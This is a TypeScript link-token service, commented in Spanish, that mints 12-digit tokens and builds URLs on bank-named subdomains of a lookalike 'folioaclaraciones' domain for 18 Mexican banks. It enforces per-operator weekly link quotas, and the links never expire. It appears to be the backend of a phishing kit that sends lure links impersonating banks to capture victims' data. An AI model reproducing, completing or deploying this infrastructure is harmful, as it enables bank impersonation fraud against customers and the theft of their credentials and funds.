import { db } from '../db';
import { linkTokens, bankSubdomains, LinkStatus, type InsertLinkToken, siteConfig } from '../../shared/schema';
import { eq, and, lt, or, sql } from 'drizzle-orm';
import { nanoid } from 'nanoid';
import { linkQuotaService } from './linkQuota';
import { randomInt } from 'crypto';

// Mapeo de códigos de banco a nombres completos con marca
const BANK_NAMES: Record<string, string> = {
  liverpool: '🏬 Liverpool',
  citibanamex: '🏦 Citibanamex',
  banbajio: '🏦 BanBajío',
  bbva: '🏦 BBVA',
  banorte: '🏦 Banorte',
  bancoppel: '🏦 BanCoppel',
  hsbc: '🏦 HSBC',
  amex: '💳 American Express',
  santander: '🏦 Santander',
  scotiabank: '🏦 Scotiabank',
  invex: '🏦 Invex',
  banregio: '🏦 Banregio',
  spin: '💳 SPIN',
  platacard: '💳 Platacard',
  bancoazteca: '🏦 Banco Azteca',
  bienestar: '🏦 Banco del Bienestar',
  inbursa: '🏦 Inbursa',
  afirme: '🏦 Afirme'
};

export class LinkTokenService {
  generateToken(): string {
    // Genera un token de 12 dígitos numéricos usando crypto (seguro)
    const min = 100000000000; // 12 dígitos mínimo
    const max = 999999999999; // 12 dígitos máximo
    return randomInt(min, max + 1).toString();
  }

  getBankName(bankCode: string): string {
    return BANK_NAMES[bankCode.toLowerCase()] || `🏦 ${bankCode.toUpperCase()}`;
  }

  async getBankSubdomain(bankCode: string): Promise<string | null> {
    const result = await db.query.bankSubdomains.findFirst({
      where: and(
        eq(bankSubdomains.bankCode, bankCode),
        eq(bankSubdomains.isActive, true)
      )
    });

    if (!result?.subdomain) return null;
    
    // Normalizar datos legacy: limpiar protocolo, espacios y extraer prefijo
    let subdomain = result.subdomain.trim().toLowerCase();
    
    // Quitar protocolo si existe (case insensitive: https://, http://, HTTP://, HTTPS://)
    subdomain = subdomain.replace(/^https?:\/\//i, '');
    
    // Si contiene punto, extraer solo el prefijo del subdominio
    if (subdomain.includes('.')) {
      subdomain = subdomain.split('.')[0];
    }
    
    // Limpiar espacios adicionales
    subdomain = subdomain.trim();
    
    // Validar que sea un prefijo DNS válido (sin guiones al inicio/final)
    if (!/^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/.test(subdomain) || subdomain.length > 63) {
      console.error(`[LinkToken] Subdominio inválido para ${bankCode}: "${result.subdomain}" normalizado a "${subdomain}"`);
      return null;
    }
    
    return subdomain;
  }

  async createLink(data: {
    userId: number;
    bankCode: string;
    sessionId?: string;
    metadata?: any;
  }): Promise<{ 
    id: number;
    token: string; 
    originalUrl: string; 
    shortUrl: string | null;
    expiresAt: Date;
  }> {
    const quota = await linkQuotaService.checkQuota(data.userId);
    
    if (!quota.allowed) {
      throw new Error(`Has alcanzado el límite semanal de ${quota.limit} links. Límite se renueva el próximo lunes.`);
    }

    const token = this.generateToken();
    const expiresAt = new Date();
    // Expiración inicial de 24 horas - el timer de 1 hora comenzará cuando el usuario ingrese el folio
    expiresAt.setHours(expiresAt.getHours() + 24);

    // Obtener el dominio base de la configuración del sitio
    const config = await db.query.siteConfig.findFirst();
    const baseUrl = config?.baseUrl || 'https://folioaclaraciones.com';
    
    // Parsear el baseUrl para extraer componentes
    let parsedUrl: URL;
    try {
      parsedUrl = new URL(baseUrl);
    } catch (error) {
      // Si falla el parsing, asumir que es solo el dominio y agregar https://
      parsedUrl = new URL(`https://${baseUrl}`);
    }
    
    const protocol = parsedUrl.protocol; // http: o https:
    const host = parsedUrl.host; // dominio.com:puerto (incluye puerto si existe)
    const hostname = parsedUrl.hostname; // solo dominio.com (sin puerto)
    const pathname = parsedUrl.pathname.replace(/\/$/, ''); // path sin trailing slash

    // Intentar obtener subdominio configurado para este banco
    const bankSubdomain = await this.getBankSubdomain(data.bankCode);
    
    let originalUrl: string;
    if (bankSubdomain) {
      // Combinar subdominio + dominio base: http://liverpool.dominio.com:puerto/client/token
      // Nota: los subdominios no preservan paths del baseUrl, solo protocolo, host y puerto
      originalUrl = `${protocol}//${bankSubdomain}.${host}/client/${token}`;
    } else {
      // Fallback al path: preservar baseUrl completo (origin + pathname) + /bankCode/client/token
      const normalizedBase = `${parsedUrl.origin}${pathname}`;
      originalUrl = `${normalizedBase}/${data.bankCode}/client/${token}`;
    }

    const [inserted] = await db.insert(linkTokens).values({
      userId: data.userId,
      sessionId: data.sessionId || null,
      bankCode: data.bankCode,
      token,
      originalUrl,
      shortUrl: null,
      bitlyLinkId: null,
      status: LinkStatus.ACTIVE,
      expiresAt,
      metadata: data.metadata || {}
    }).returning();

    try {
      await linkQuotaService.incrementUsage(data.userId);
    } catch (error) {
      console.error('[Links] Error incrementando cuota, pero link creado:', error);
    }

    return {
      id: inserted.id,
      token,
      originalUrl,
      shortUrl: null, // Bitly deshabilitado
      expiresAt
    };
  }

  async validateAndConsumeToken(token: string, metadata?: any): Promise<{ 
    valid: boolean; 
    linkId?: number;
    bankCode?: string;
    sessionId?: string;
    userId?: number;
    createdBy?: string;
    reason?: 'not_found' | 'already_used' | 'expired' | 'cancelled';
    error?: string;
  }> {
    const link = await db.query.linkTokens.findFirst({
      where: eq(linkTokens.token, token)
    });

    if (!link) {
      return { valid: false, reason: 'not_found', error: 'Token no encontrado' };
    }

    if (link.status === LinkStatus.CONSUMED) {
      return { valid: false, reason: 'already_used', error: 'Este link ya fue usado' };
    }

    if (link.status === LinkStatus.CANCELLED) {
      return { valid: false, reason: 'cancelled', error: 'Este link fue cancelado' };
    }

    // NO validar expiración por tiempo - los links no expiran automáticamente
    // Solo se invalidan cuando: 1) se consume el token o 2) se cancela manualmente

    const now = new Date();
    // NO consumir el token aquí - solo actualizar metadata y último acceso
    // El token se consumirá cuando el usuario interactúe con la sesión
    const updatedMetadata = metadata ? { ...(link.metadata as any || {}), ...metadata, lastAccess: now.toISOString() } : link.metadata;
    
    await db.update(linkTokens)
      .set({ 
        metadata: updatedMetadata,
        updatedAt: now 
      })
      .where(eq(linkTokens.id, link.id));

    return {
      valid: true,
      linkId: link.id,
      bankCode: link.bankCode,
      sessionId: link.sessionId || undefined,
      userId: link.userId,
      createdBy: (link.metadata as any)?.createdBy || 'system'
    };
  }

  async consumeToken(token: string): Promise<void> {
    const now = new Date();
    await db.update(linkTokens)
      .set({ 
        status: LinkStatus.CONSUMED, 
        usedAt: now,
        updatedAt: now 
      })
      .where(eq(linkTokens.token, token));
  }

  async updateTokenSession(token: string, sessionId: string): Promise<void> {
    await db.update(linkTokens)
      .set({ 
        sessionId,
        updatedAt: new Date()
      })
      .where(eq(linkTokens.token, token));
  }

  async getLinkBySession(sessionId: string): Promise<{ id: number; token: string; status: string } | null> {
    const link = await db.query.linkTokens.findFirst({
      where: eq(linkTokens.sessionId, sessionId),
      columns: {
        id: true,
        token: true,
        status: true
      }
    });
    
    return link || null;
  }

  // MÉTODOS DE EXPIRACIÓN ELIMINADOS - Los links no expiran por tiempo
  // Solo se invalidan cuando: 1) usuario ingresa folio o 2) admin cancela manualmente

  async cancelLink(linkId: number): Promise<void> {
    await db.update(linkTokens)
      .set({
        status: LinkStatus.CANCELLED,
        updatedAt: new Date()
      })
      .where(eq(linkTokens.id, linkId));
  }

  async getLinkHistory(userId: number, limit: number = 50): Promise<any[]> {
    const links = await db.query.linkTokens.findMany({
      where: eq(linkTokens.userId, userId),
      orderBy: (linkTokens, { desc }) => [desc(linkTokens.createdAt)],
      limit
    });

    // Los links no expiran por tiempo, solo devolver su estado actual
    return links.map(link => ({
      ...link,
      isExpired: link.status === LinkStatus.EXPIRED || link.status === LinkStatus.CANCELLED
    }));
  }
}

export const linkTokenService = new LinkTokenService();
